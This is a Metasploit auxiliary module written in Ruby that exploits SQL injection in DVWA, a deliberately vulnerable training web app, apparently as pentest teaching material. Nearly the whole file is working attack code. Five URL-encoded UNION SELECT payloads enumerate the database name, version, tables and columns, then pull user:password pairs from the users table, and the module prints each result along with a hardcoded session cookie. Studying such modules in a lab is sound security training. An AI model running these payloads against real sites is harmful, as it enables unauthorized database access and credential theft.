require 'rex/proto/http'
require 'msf/core'
class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	def initialize
		super(
			'Name'        => 'DVWA SQL Injection Pawnage',
			'Description' => 'Exploits SQL Injection Bug to Harvest Database',
			'Author'      => 'Nipun_Jaswal',
			'License'     => MSF_LICENSE)
			register_options(
			[
				OptString.new('DIRS', [ true,  "Directory Structure", '/vulnerabilities/sqli/'])
			], self.class)
	end
	def run_host(ip)
		begin
		# Global Variables Assignment
		dir_path = datastore['DIRS']
		# SQL Injection Statements
		sqli1 = "-2%27%20UNION%20SELECT%20NULL%2Cdatabase%28%29--+&Submit=Submit"  
		sqli2 = "-2%27%20UNION%20SELECT%20NULL%2Cversion%28%29--+&Submit=Submit"
		sqli3 = "-2%27%20UNION%20SELECT%20NULL%2Cgroup_concat%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29--+&Submit=Submit"
		sqli4 = "-2%27%20UNION%20SELECT%20NULL%2Cgroup_concat%28column_name%29%20from%20information_schema.columns%20where%20table_name%3D%27users%27--+&Submit=Submit"
		sqli5 = "-2%27%20UNION%20SELECT%20NULL%2Cgroup_concat%28user%2C0x3a%2Cpassword%29%20from%20users--+&Submit=Submit"
		# SQL Injection Statement Execution
		req1 = request_inject(dir_path,sqli1)
		print_line("[+]Database Name: #{req1}")
		req2 = request_inject(dir_path,sqli2)
		print_line("[+]Version Number: #{req2}")
		req3 = request_inject(dir_path,sqli3)
		print_line("[+]Table Namses: #{req3}")
		req4 = request_inject(dir_path,sqli4)
		print_line("[+]Column Names: #{req4}")
		req5 = request_inject(dir_path,sqli5)
		print_line("[+]Credentials: #{req5}")
		end
	end
	

	# SQLi Data Finder Module
	def cleaner(res)
		find1= (res.body =~ /Surname:/)
		find2= (res.body =~ /<\/pre>/)
		find1=find1+9
		len= find2-find1
		data=res.body[find1,len]
		return data
	end
	# SQLi Request Generation Module
	def request_inject(dir_path,sqli)
		responsed = send_request_raw({
			'method'    => 'GET',
			'uri'       => "#{dir_path}index.php?id=#{sqli}",
			'cookie'    => "adminer_version=0; PHPSESSID=h51ua727rtj2193ghn69s51ec5; security=low"
					})
		to_sani = cleaner(responsed)
		return to_sani
	end

end

